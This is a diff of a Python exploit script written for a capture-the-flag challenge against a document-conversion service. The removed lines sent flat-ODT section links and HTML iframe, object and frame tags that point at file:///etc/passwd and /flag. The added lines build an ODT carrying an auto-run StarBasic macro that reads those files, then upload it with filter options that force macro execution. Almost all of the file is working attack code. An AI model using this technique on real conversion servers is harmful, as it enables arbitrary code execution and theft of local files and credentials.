@@ -1,27 +1,102 @@
 #!/usr/bin/env python3
-"""Temporary CTF flat-XML/HTML format-detection probe."""
+"""Temporary CTF MacroExecutionMode probe."""
+import io
+import json
+import pathlib
 import urllib.error
 import urllib.request
 import uuid
+import zipfile
 
 BASE = "http://njwqato3tpdz0t6k.instances.ctfcup.online"
+POC = pathlib.Path(__file__).with_name("poc.odt")
+
+BASIC = r'''Sub Main()
+    Dim s As String
+    s = "MACRO_EXECUTED" & Chr(10) & ReadLocal("/etc/passwd") & Chr(10) & ReadLocal("/flag")
+    ThisComponent.Text.String = s
+End Sub
+
+Function ReadLocal(path As String) As String
+    Dim i As Integer
+    Dim line As String
+    Dim result As String
+    On Error GoTo Failed
+    i = FreeFile
+    Open path For Input As #i
+    Do While Not EOF(i)
+        Line Input #i, line
+        result = result & line & Chr(10)
+    Loop
+    Close #i
+    ReadLocal = result
+    Exit Function
+Failed:
+    ReadLocal = "READ_FAILED:" & path
+End Function
+'''
+
+SCRIPT_LC = '''<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE library:libraries PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "libraries.dtd">
+<library:libraries xmlns:library="http://openoffice.org/2000/library" xmlns:xlink="http://www.w3.org/1999/xlink">
+<library:library library:name="Standard" xlink:href="Standard/script-lb.xml" xlink:type="simple" library:link="false"/>
+</library:libraries>'''
+SCRIPT_LB = '''<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE library:library PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "library.dtd">
+<library:library xmlns:library="http://openoffice.org/2000/library" xmlns:xlink="http://www.w3.org/1999/xlink" library:name="Standard" library:readonly="false" library:passwordprotected="false">
+<library:element library:name="Module1"/></library:library>'''
+MODULE = ('<?xml version="1.0" encoding="UTF-8"?>\n'
+          '<!DOCTYPE script:module PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "module.dtd">\n'
+          '<script:module xmlns:script="http://openoffice.org/2000/script" script:name="Module1" '
+          'script:language="StarBasic" script:moduleType="normal"><![CDATA[\n' + BASIC + '\n]]></script:module>')
+EVENTS = '''<office:scripts><office:event-listeners>
+<script:event-listener script:language="ooo:script" script:event-name="dom:load" xlink:href="vnd.sun.star.script:Standard.Module1.Main?language=Basic&amp;location=document" xlink:type="simple"/>
+</office:event-listeners></office:scripts>'''
+MANIFEST_ENTRIES = '''
+<manifest:file-entry manifest:full-path="Basic/" manifest:media-type=""/>
+<manifest:file-entry manifest:full-path="Basic/script-lc.xml" manifest:media-type="text/xml"/>
+<manifest:file-entry manifest:full-path="Basic/Standard/" manifest:media-type="application/vnd.sun.star.basic-library"/>
+<manifest:file-entry manifest:full-path="Basic/Standard/script-lb.xml" manifest:media-type="text/xml"/>
+<manifest:file-entry manifest:full-path="Basic/Standard/Module1.xml" manifest:media-type="text/xml"/>
+'''
 
 
-def send(data, filename, label, fmt="txt"):
-    if isinstance(data, str):
-        data = data.encode()
+def macro_odt():
+    out = io.BytesIO()
+    with zipfile.ZipFile(POC) as zin, zipfile.ZipFile(out, "w") as zout:
+        for info in zin.infolist():
+            data = zin.read(info.filename)
+            if info.filename == "content.xml":
+                text = data.decode()
+                if "xmlns:script=" not in text:
+                    text = text.replace("<office:document-content ", '<office:document-content xmlns:script="urn:oasis:names:tc:opendocument:xmlns:script:1.0" ', 1)
+                text = text.replace("<office:body>", EVENTS + "<office:body>", 1)
+                text = text.replace("<text:section", "<text:p>ORIGINAL_DOCUMENT</text:p><text:section", 1)
+                data = text.encode()
+            elif info.filename == "META-INF/manifest.xml":
+                data = data.decode().replace("</manifest:manifest>", MANIFEST_ENTRIES + "</manifest:manifest>").encode()
+            zout.writestr(info, data)
+        zout.writestr("Basic/script-lc.xml", SCRIPT_LC, compress_type=zipfile.ZIP_DEFLATED)
+        zout.writestr("Basic/Standard/script-lb.xml", SCRIPT_LB, compress_type=zipfile.ZIP_DEFLATED)
+        zout.writestr("Basic/Standard/Module1.xml", MODULE, compress_type=zipfile.ZIP_DEFLATED)
+    return out.getvalue()
+
+
+def send(data, fields, label):
     boundary = "----Arena" + uuid.uuid4().hex
-    body = (
-        f"--{boundary}\r\n"
-        f'Content-Disposition: form-data; name="data"; filename="{filename}"\r\n'
-        "Content-Type: application/octet-stream\r\n\r\n"
-    ).encode() + data + f"\r\n--{boundary}--\r\n".encode()
-    req = urllib.request.Request(BASE + "/cool/convert-to/" + fmt, data=body, method="POST")
+    chunks = []
+    for name, value in fields.items():
+        chunks.append(f"--{boundary}\r\nContent-Disposition: form-data; name=\"{name}\"\r\n\r\n{value}\r\n".encode())
+    chunks.append(f"--{boundary}\r\nContent-Disposition: form-data; name=\"data\"; filename=\"macro.odt\"\r\nContent-Type: application/vnd.oasis.opendocument.text\r\n\r\n".encode())
+    chunks.append(data)
+    chunks.append(f"\r\n--{boundary}--\r\n".encode())
+    body = b"".join(chunks)
+    req = urllib.request.Request(BASE + "/cool/convert-to/txt", data=body, method="POST")
     req.add_header("Content-Type", "multipart/form-data; boundary=" + boundary)
-    print("\n===", label, repr(filename), flush=True)
+    print("\n===", label, fields, flush=True)
     try:
         with urllib.request.urlopen(req, timeout=90) as r:
-            raw = r.read(500000)
+            raw = r.read(1000000)
             print("STATUS", r.status, "BYTES", len(raw), "RESPONSE", raw.decode("utf-8", "replace"), flush=True)
     except urllib.error.HTTPError as e:
         print("HTTP_ERROR", e.code, e.read(200000).decode("utf-8", "replace"), flush=True)
@@ -29,21 +104,20 @@ def send(data, filename, label, fmt="txt"):
         print("ERROR", repr(e), flush=True)
 
 
-def fodt(target):
-    return f'''<?xml version="1.0" encoding="UTF-8"?>
-<office:document xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0" xmlns:xlink="http://www.w3.org/1999/xlink" office:version="1.2" office:mimetype="application/vnd.oasis.opendocument.text">
-<office:body><office:text><text:p>ARENA_MARKER</text:p><text:section text:name="s"><text:section-source xlink:href="file://{target}" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></text:section></office:text></office:body></office:document>'''
+def descriptor(name, typ, value):
+    return json.dumps({name: {"type": typ, "value": value}}, separators=(",", ":"))
 
 
-for filename in ("flat.fodt", "flat.txt", "flat.xml"):
-    send(fodt("/etc/passwd"), filename, "FLAT_ODT")
-for filename in ("html.html", "html.txt"):
-    send("<!doctype html><html><body>ARENA_MARKER</body></html>", filename, "HTML_MARKER")
-for tag in (
-    '<iframe src="file:///etc/passwd" width="600" height="400"></iframe>',
-    '<object data="file:///etc/passwd" type="text/plain" width="600" height="400"></object>',
-    '<frameset><frame src="file:///etc/passwd"></frameset>',
-):
-    send("<!doctype html><html><body>ARENA_MARKER" + tag + "</body></html>", "include.txt", "HTML_FILE_INCLUDE")
-send(fodt("/flag"), "flat.txt", "FLAT_ODT_FLAG")
-send("<!doctype html><html><body><iframe src=\"file:///flag\" width=\"600\" height=\"400\"></iframe></body></html>", "include.txt", "HTML_FLAG")
+def main():
+    doc = macro_odt()
+    print("MACRO_ODT_BYTES", len(doc), flush=True)
+    send(doc, {}, "NO_OPTIONS")
+    send(doc, {"infilterOptions": descriptor("MacroExecutionMode", "short", "4")}, "MACRO_SHORT_4")
+    both = json.dumps({"MacroExecutionMode": {"type": "short", "value": "4"}, "UpdateDocMode": {"type": "short", "value": "3"}}, separators=(",", ":"))
+    send(doc, {"infilterOptions": both}, "MACRO_AND_UPDATE")
+    send(doc, {"infilterOptions": descriptor("MacroExecutionMode", "long", "4")}, "MACRO_LONG_4")
+    send(doc, {"infilterOptions": "MacroExecutionMode=4"}, "MACRO_LEGACY")
+
+
+if __name__ == "__main__":
+    main()
